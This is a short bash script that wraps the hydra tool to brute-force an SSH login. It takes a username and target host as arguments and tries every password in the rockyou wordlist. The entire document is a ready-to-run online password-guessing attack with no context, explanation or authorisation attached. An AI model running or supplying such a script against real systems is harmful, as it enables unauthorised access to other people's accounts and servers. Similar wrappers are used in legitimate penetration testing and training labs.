#!/bin/bash
echo "Brute Forcing SSH user $1 on $2 with rockyou"
hydra -l $1 -P /usr/share/wordlists/rockyou.txt $2 -t 4 ssh
